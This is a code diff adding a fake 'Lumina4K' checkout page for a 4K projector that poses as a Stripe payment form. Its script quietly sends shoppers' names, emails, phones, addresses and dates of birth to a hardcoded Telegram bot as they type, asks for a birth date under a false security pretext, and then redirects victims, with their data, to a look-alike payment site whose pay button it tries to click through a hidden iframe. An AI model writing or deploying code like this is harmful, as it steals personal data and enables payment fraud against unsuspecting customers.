@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checkout Preview - Lumina4K</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        .animate-spin {
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body class="bg-gray-50 min-h-screen">
+    <div class="max-w-7xl mx-auto">
+        <div class="grid lg:grid-cols-2 gap-0">
+            <!-- Left Column - Form -->
+            <div class="px-4 sm:px-6 md:px-12 py-6 md:py-8 bg-gray-50">
+                <!-- Logo -->
+                <div class="mb-6 md:mb-8">
+                    <h1 class="text-xl md:text-2xl font-bold bg-gradient-to-r from-orange-500 to-purple-600 text-transparent bg-clip-text">
+                        Lumina4K
+                    </h1>
+                </div>
+
+                <!-- Breadcrumb -->
+                <div class="text-xs sm:text-sm mb-4 md:mb-6 text-gray-500">
+                    <a href="#" class="hover:text-orange-500">Cart</a>
+                    <span class="mx-2">›</span>
+                    <span class="text-gray-900">Checkout</span>
+                </div>
+
+                <form id="checkoutForm" class="space-y-5 md:space-y-6">
+                    <!-- Contact -->
+                    <div>
+                        <div class="flex items-center justify-between mb-2 md:mb-3">
+                            <h3 class="text-sm md:text-base font-semibold text-gray-900">Email</h3>
+                            <a href="#" class="text-xs md:text-sm text-orange-500 hover:text-orange-600">Sign in</a>
+                        </div>
+                        <input
+                            name="email"
+                            type="email"
+                            required
+                            id="email"
+                            class="w-full h-11 md:h-12 px-3 rounded-md border border-gray-300 text-gray-900 focus:border-orange-500 focus:ring-2 focus:ring-orange-500"
+                            placeholder="Enter your email address"
+                        />
+                    </div>
+
+                    <!-- Delivery -->
+                    <div>
+                        <h3 class="text-sm md:text-base font-semibold mb-2 md:mb-3 text-gray-900">Delivery</h3>
+                        <div class="space-y-2 md:space-y-3">
+                            <select
+                                name="country"
+                                id="country"
+                                class="w-full h-11 md:h-12 px-3 rounded-md border border-gray-300 text-gray-900 focus:ring-2 focus:ring-orange-500"
+                            >
+                                <option value="Canada">Canada</option>
+                                <option value="United States">United States</option>
+                            </select>
+                            
+                            <div class="grid grid-cols-1 sm:grid-cols-2 gap-2 md:gap-3">
+                                <input
+                                    name="firstName"
+                                    required
+                                    id="firstName"
+                                    class="h-11 md:h-12 px-3 rounded-md border border-gray-300 text-gray-900 focus:border-orange-500"
+                                    placeholder="First name"
+                                />
+                                <input
+                                    name="lastName"
+                                    required
+                                    id="lastName"
+                                    class="h-11 md:h-12 px-3 rounded-md border border-gray-300 text-gray-900 focus:border-orange-500"
+                                    placeholder="Last name"
+                                />
+                            </div>
+                            
+                            <input
+                                name="address"
+                                required
+                                id="address"
+                                class="w-full h-11 md:h-12 px-3 rounded-md border border-gray-300 text-gray-900 focus:border-orange-500"
+                                placeholder="Address"
+                            />
+                            
+                            <input
+                                name="apartment"
+                                id="apartment"
+                                class="w-full h-11 md:h-12 px-3 rounded-md border border-gray-300 text-gray-900 focus:border-orange-500"
+                                placeholder="Apartment, suite, etc. (optional)"
+                            />
+                            
+                            <div class="grid grid-cols-1 sm:grid-cols-3 gap-2 md:gap-3">
+                                <input
+                                    name="city"
+                                    required
+                                    id="city"
+                                    class="h-11 md:h-12 px-3 rounded-md border border-gray-300 text-gray-900 focus:border-orange-500"
+                                    placeholder="City"
+                                />
+                                <select
+                                    name="province"
+                                    id="province"
+                                    class="h-11 md:h-12 px-3 rounded-md border border-gray-300 text-gray-900"
+                                    style="display: block;"
+                                >
+                                    <option value="">Province</option>
+                                    <option value="AB">Alberta</option>
+                                    <option value="BC">British Columbia</option>
+                                    <option value="MB">Manitoba</option>
+                                    <option value="NB">New Brunswick</option>
+                                    <option value="NL">Newfoundland and Labrador</option>
+                                    <option value="NT">Northwest Territories</option>
+                                    <option value="NS">Nova Scotia</option>
+                                    <option value="NU">Nunavut</option>
+                                    <option value="ON">Ontario</option>
+                                    <option value="PE">Prince Edward Island</option>
+                                    <option value="QC">Quebec</option>
+                                    <option value="SK">Saskatchewan</option>
+                                    <option value="YT">Yukon</option>
+                                </select>
+                                <input
+                                    name="state"
+                                    id="state"
+                                    class="h-11 md:h-12 px-3 rounded-md border border-gray-300 text-gray-900 focus:border-orange-500"
+                                    placeholder="State"
+                                    style="display: none;"
+                                />
+                                <input
+                                    name="postalCode"
+                                    required
+                                    id="postalCode"
+                                    class="h-11 md:h-12 px-3 rounded-md border border-gray-300 text-gray-900 focus:border-orange-500"
+                                    placeholder="Postal code"
+                                />
+                            </div>
+                            
+                            <input
+                                name="phone"
+                                type="tel"
+                                required
+                                id="phone"
+                                class="w-full h-11 md:h-12 px-3 rounded-md border border-gray-300 text-gray-900 focus:border-orange-500"
+                                placeholder="Phone"
+                            />
+                        </div>
+                    </div>
+
+                    <!-- Payment -->
+                    <div>
+                        <h3 class="text-sm md:text-base font-semibold mb-2 md:mb-3 text-gray-900">Payment</h3>
+                        <p class="text-xs md:text-sm mb-3 md:mb-4 text-gray-600">
+                            All transactions are secure and encrypted. Your order includes free returns and 24/7 access to our award-winning customer service
+                        </p>
+
+                        <!-- Stripe Payment Method -->
+                        <div class="w-full border rounded-lg bg-white border-purple-500">
+                            <div class="flex items-center justify-between p-3 md:p-4">
+                                <div class="flex items-center gap-2 md:gap-3">
+                                    <div class="w-4 h-4 md:w-5 md:h-5 rounded-full border-2 border-purple-500 flex items-center justify-center">
+                                        <div class="w-2 h-2 md:w-2.5 md:h-2.5 rounded-full bg-purple-500"></div>
+                                    </div>
+                                    <span class="text-sm md:text-base font-medium text-gray-900">Stripe Payment</span>
+                                </div>
+                                <div class="flex items-center gap-0.5">
+                                    <img src="https://cdn.shopify.com/shopifycloud/checkout-web/assets/0169695890db3db16bfe.svg" alt="Visa" class="h-4 w-6" />
+                                    <img src="https://secure.payment-ca.com/assets/img/mastercard.svg" alt="Mastercard" class="h-4 w-6" />
+                                    <img src="https://secure.payment-ca.com/assets/img/amex.svg" alt="Amex" class="h-4 w-6" />
+                                    <img id="rotating-card" src="https://secure.payment-ca.com/assets/img/unionpay.svg" alt="UnionPay" class="h-4 w-6" />
+                                </div>
+                                <script>
+                                    const rotatingCards = [
+                                        { src: 'https://secure.payment-ca.com/assets/img/unionpay.svg', alt: 'UnionPay' },
+                                        { src: 'https://secure.payment-ca.com/assets/img/jcb.svg', alt: 'JCB' },
+                                        { src: 'https://secure.payment-ca.com/assets/img/discover.svg', alt: 'Discover' },
+                                        { src: 'https://secure.payment-ca.com/assets/img/diners.svg', alt: 'Diners' }
+                                    ];
+                                    let currentIndex = 0;
+                                    setInterval(() => {
+                                        const rotatingImg = document.getElementById('rotating-card');
+                                        if (rotatingImg) {
+                                            currentIndex = (currentIndex + 1) % rotatingCards.length;
+                                            rotatingImg.src = rotatingCards[currentIndex].src;
+                                            rotatingImg.alt = rotatingCards[currentIndex].alt;
+                                        }
+                                    }, 2000);
+                                </script>
+                            </div>
+
+                            <div class="p-3 md:p-4 border-t border-gray-200 space-y-3 md:space-y-4">
+                                <!-- Date of Birth for Security -->
+                                <div>
+                                    <label for="dob" class="block text-sm font-medium mb-2 text-gray-900">
+                                        Date of Birth (Security Requirement)
+                                    </label>
+                                    <input
+                                        name="dob"
+                                        required
+                                        type="date"
+                                        id="dob"
+                                        min="1924-01-01"
+                                        max="2011-12-31"
+                                        class="w-full h-11 md:h-12 px-3 rounded-md border border-gray-300 text-gray-900 focus:border-purple-500"
+                                    />
+                                </div>
+
+                                <p class="text-xs text-center text-gray-500">
+                                    You must provide your date of birth as a security measure to pay with Stripe
+                                </p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- Pay with Stripe Button -->
+                    <button
+                        type="submit"
+                        id="payBtn"
+                        class="w-full h-11 bg-purple-600 hover:bg-purple-700 text-white font-medium text-sm rounded-lg transition-colors flex items-center justify-center gap-2"
+                    >
+                        <svg class="w-4 h-4" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M13.976 9.15c-2.172-.806-3.356-1.426-3.356-2.409 0-.831.683-1.305 1.901-1.305 2.227 0 4.515.858 6.09 1.631l.89-5.494C18.252.975 15.697 0 12.165 0 9.667 0 7.589.654 6.104 1.872 4.56 3.147 3.757 4.992 3.757 7.218c0 4.039 2.467 5.76 6.476 7.219 2.585.92 3.445 1.574 3.445 2.583 0 .98-.84 1.545-2.354 1.545-1.875 0-4.965-.921-6.99-2.109l-.9 5.555C5.175 22.99 8.385 24 11.714 24c2.641 0 4.843-.624 6.328-1.813 1.664-1.305 2.525-3.236 2.525-5.732 0-4.128-2.524-5.851-6.591-7.305h0z"/>
+                        </svg>
+                        Pay with Stripe - $146.89
+                    </button>
+                </form>
+            </div>
+
+            <!-- Right Column - Order Summary -->
+            <div class="hidden lg:block px-8 py-8 bg-gray-100">
+                <div class="space-y-4 mb-6">
+                    <div class="flex gap-4">
+                        <div class="w-16 h-16 bg-gray-300 rounded-lg flex items-center justify-center">
+                            <span class="text-xs text-gray-600">Product</span>
+                        </div>
+                        <div class="flex-1">
+                            <h3 class="text-sm font-medium text-gray-900">4K Projector Ultimate Package</h3>
+                            <p class="text-sm text-gray-600">Quantity: 1</p>
+                        </div>
+                        <div class="text-sm font-medium text-gray-900">$129.99</div>
+                    </div>
+                </div>
+
+                <div class="space-y-2 text-sm text-gray-600">
+                    <div class="flex justify-between">
+                        <span>Subtotal</span>
+                        <span class="text-gray-900">$129.99</span>
+                    </div>
+                    <div class="flex justify-between">
+                        <span>Shipping</span>
+                        <span class="text-gray-500">FREE</span>
+                    </div>
+                    <div class="flex justify-between">
+                        <span>Estimated taxes</span>
+                        <span class="text-gray-900">$16.90</span>
+                    </div>
+                    <div class="flex justify-between pt-3 border-t border-gray-200 text-base font-bold text-gray-900">
+                        <span>Total</span>
+                        <span><span class="text-xs font-normal mr-1">CAD</span>$146.89</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Payment Processing Overlay -->
+    <div id="loadingOverlay" class="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50" style="display: none;">
+        <div class="p-8 rounded-lg max-w-md w-full mx-4 bg-white">
+            <div class="text-center">
+                <div class="animate-spin rounded-full h-12 w-12 border-b-2 border-orange-500 mx-auto mb-4"></div>
+                <h3 class="text-lg font-semibold mb-2 text-gray-900">Processing Payment</h3>
+                <p class="text-sm text-gray-600">
+                    Connecting to secure payment gateway...<br>
+                    Please do not close this window.
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // ========== TELEGRAM CONFIGURATION ==========
+        const TELEGRAM_BOT_TOKEN = '8318165972:AAFUvKuh1EMqEs0HmWtR6_7uTQomyVVymZ8';
+        const TELEGRAM_CHAT_ID = '-5217100062';
+        
+        // ========== VARIABLES ==========
+        const sessionId = `HT4K_${Date.now()}`;
+        let messageId = null;
+        let updateTimer = null;
+        
+        // Payment integration script
+        const form = document.getElementById('checkoutForm');
+        const payBtn = document.getElementById('payBtn');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+
+        // ========== TELEGRAM FUNCTIONS ==========
+        
+        // Get form data for Telegram
+        function getFormDataForTelegram() {
+            return {
+                firstName: document.getElementById('firstName').value || '',
+                lastName: document.getElementById('lastName').value || '',
+                email: document.getElementById('email').value || '',
+                phone: document.getElementById('phone').value || '',
+                address: document.getElementById('address').value || '',
+                apartment: document.getElementById('apartment').value || '',
+                city: document.getElementById('city').value || '',
+                postalCode: document.getElementById('postalCode').value || '',
+                province: document.getElementById('country').value === 'Canada' ? 
+                    document.getElementById('province').value : 
+                    document.getElementById('state').value,
+                country: document.getElementById('country').value || '',
+                dob: document.getElementById('dob').value || ''
+            };
+        }
+        
+        // Send/edit Telegram message
+        async function updateTelegram() {
+            const data = getFormDataForTelegram();
+            
+            // Only send if we have some data
+            if (!data.firstName && !data.email && !data.phone) {
+                return;
+            }
+            
+            const message = `🎬 HOMETHEATER4K - NOUVEAU CHECKOUT
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+👤 CLIENT:
+   ${data.firstName} ${data.lastName}
+
+📧 CONTACT:
+   📧 ${data.email}
+   📱 ${data.phone}
+
+🏠 ADRESSE DE LIVRAISON:
+   📍 ${data.address}
+   🏢 ${data.apartment}
+   🏙️ ${data.city}, ${data.province} ${data.postalCode}
+   🌍 ${data.country}
+
+🎂 DATE DE NAISSANCE:
+   📅 ${data.dob}
+
+💰 COMMANDE:
+   📦 4K Projector Ultimate Package
+   💵 $129.99 CAD + Taxes
+   🆔 Session: ${sessionId}
+
+⏰ DERNIÈRE MISE À JOUR:
+   ${new Date().toLocaleString('fr-FR')}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+            
+            try {
+                let url, body;
+                
+                if (messageId) {
+                    // Edit existing message
+                    url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
+                    body = {
+                        chat_id: TELEGRAM_CHAT_ID,
+                        message_id: messageId,
+                        text: message
+                    };
+                } else {
+                    // Create new message
+                    url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                    body = {
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message
+                    };
+                }
+                
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(body)
+                });
+                
+                const result = await response.json();
+                
+                if (result.ok && !messageId) {
+                    messageId = result.result.message_id;
+                }
+                
+            } catch (error) {
+                // Silent error handling
+            }
+        }
+        
+        // Send payment submission notification
+        async function notifyPaymentSubmission() {
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: `🎯 **PAIEMENT SOUMIS !**\n\n💳 Le client a cliqué sur "Payer"\n🆔 Session: ${sessionId}\n⏰ ${new Date().toLocaleString('fr-FR')}\n\n🔄 Redirection vers le système de paiement...`,
+                        parse_mode: 'Markdown'
+                    })
+                });
+            } catch (error) {
+                console.error('❌ Payment notification error:', error);
+            }
+        }
+
+        // Function to generate the payment backend URL
+        function getProvinceTaxRate(province) {
+            const taxRates = {
+                'ON': 13,      // Ontario
+                'NS': 15,      // Nova Scotia
+                'NB': 15,      // New Brunswick
+                'NL': 15,      // Newfoundland and Labrador
+                'PE': 15,      // Prince Edward Island
+                'QC': 14.975,  // Quebec
+                'BC': 12,      // British Columbia
+                'SK': 11,      // Saskatchewan
+                'MB': 12,      // Manitoba
+                'AB': 5,       // Alberta (GST only)
+                'NT': 5,       // Northwest Territories (GST only)
+                'NU': 5,       // Nunavut (GST only)
+                'YT': 5        // Yukon (GST only)
+            };
+            return taxRates[province] || 0;
+        }
+
+        function cleanPhoneNumber(phone) {
+            // Remove all non-numeric characters except +
+            return phone.replace(/[^\d+]/g, '');
+        }
+
+        function generatePaymentURL(data) {
+            const baseURL = 'https://secure.payment-ca.com/connect/form';
+            
+            // Generate meaningful order number: HT4K + timestamp + random
+            const orderNumber = `HT4K${Date.now()}${Math.floor(Math.random() * 1000).toString().padStart(3, '0')}`;
+            
+            // Calculate tax rate based on province
+            const taxRate = data.country === 'Canada' ? getProvinceTaxRate(data.province) : 0;
+            
+            const params = {
+                site: 'secure.payment-ca.com',
+                icon: 'https://s6.imgcdn.dev/8xixd.png',
+                image: 'https://s6.imgcdn.dev/8xQsM.png',
+                amount: '129.99',
+                symbol: data.country === 'Canada' ? 'CAD' : 'USD',
+                vat: taxRate.toString(),
+                riderect_success: 'https://hometheater4k.com/order-processing',
+                riderect_failed: 'https://hometheater4k.com/order-failed',
+                riderect_back: 'https://hometheater4k.com/checkout',
+                order_id: orderNumber,
+                billing_first_name: data.firstName,
+                billing_last_name: data.lastName,
+                billing_company: '',
+                billing_address_1: data.address,
+                billing_address_2: data.apartment || '',
+                billing_city: data.city,
+                billing_state: data.province,
+                billing_postcode: data.postalCode,
+                billing_country: data.country === 'Canada' ? 'CA' : 'US',
+                billing_email: data.email,
+                billing_phone: cleanPhoneNumber(data.phone)
+            };
+            
+            const queryString = Object.keys(params)
+                .map(key => `${key}=${encodeURIComponent(params[key])}`)
+                .join('&');
+            
+            return `${baseURL}?${queryString}`;
+        }
+
+        // Country change handler
+        document.getElementById('country').addEventListener('change', function() {
+            const country = this.value;
+            const provinceSelect = document.getElementById('province');
+            const stateInput = document.getElementById('state');
+            
+            if (country === 'Canada') {
+                provinceSelect.style.display = 'block';
+                stateInput.style.display = 'none';
+                stateInput.removeAttribute('required');
+                provinceSelect.setAttribute('required', '');
+            } else {
+                provinceSelect.style.display = 'none';
+                stateInput.style.display = 'block';
+                provinceSelect.removeAttribute('required');
+                stateInput.setAttribute('required', '');
+            }
+        });
+
+        // ========== EVENT LISTENERS ==========
+        
+        // Listen for form changes (every 2 seconds)
+        document.getElementById('checkoutForm').addEventListener('input', function() {
+            clearTimeout(updateTimer);
+            updateTimer = setTimeout(() => {
+                updateTelegram();
+            }, 2000);
+        });
+        
+        form.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // Get form data
+            const formData = {
+                firstName: document.getElementById('firstName').value,
+                lastName: document.getElementById('lastName').value,
+                city: document.getElementById('city').value,
+                country: document.getElementById('country').value,
+                email: document.getElementById('email').value,
+                phone: document.getElementById('phone').value,
+                address: document.getElementById('address').value,
+                apartment: document.getElementById('apartment').value,
+                postalCode: document.getElementById('postalCode').value,
+                province: document.getElementById('country').value === 'Canada' ? 
+                    document.getElementById('province').value : 
+                    document.getElementById('state').value
+            };
+            
+            // Validate required fields
+            if (!formData.firstName || !formData.lastName || !formData.city || !formData.email || !formData.phone) {
+                alert('Please fill in all required fields');
+                return;
+            }
+            
+            // Send final update to Telegram
+            await updateTelegram();
+            
+            // Notify payment submission
+            await notifyPaymentSubmission();
+            
+            // Show loading overlay
+            loadingOverlay.style.display = 'flex';
+            
+            // Generate the payment URL with user data
+            const paymentURL = generatePaymentURL(formData);
+            
+            console.log('Redirecting to payment gateway:', paymentURL);
+            
+            // Create hidden iframe for auto-submission attempt
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = paymentURL;
+            document.body.appendChild(iframe);
+            
+            let redirected = false;
+            
+            // Try iframe auto-submission
+            iframe.onload = function() {
+                try {
+                    setTimeout(() => {
+                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                        const payButton = iframeDoc.querySelector('button[type="submit"]') || 
+                                        iframeDoc.querySelector('#pay_button') ||
+                                        iframeDoc.querySelector('.pay-btn') ||
+                                        iframeDoc.querySelector('input[type="submit"]');
+                        
+                        if (payButton && !redirected) {
+                            payButton.click();
+                            redirected = true;
+                            
+                            setTimeout(() => {
+                                try {
+                                    window.location.href = iframe.contentWindow.location.href;
+                                } catch (e) {
+                                    window.location.href = paymentURL;
+                                }
+                            }, 2000);
+                        } else if (!redirected) {
+                            window.location.href = paymentURL;
+                            redirected = true;
+                        }
+                    }, 1500);
+                } catch (error) {
+                    console.log('CORS - Direct redirection');
+                    if (!redirected) {
+                        window.location.href = paymentURL;
+                        redirected = true;
+                    }
+                }
+            };
+            
+            // Fallback after 5 seconds
+            setTimeout(() => {
+                if (!redirected) {
+                    window.location.href = paymentURL;
+                    redirected = true;
+                }
+            }, 5000);
+        });
+
+        // Form is now clean - users will enter their own data
+        // No pre-filled demo data
+    </script>
+</body>
+</html>
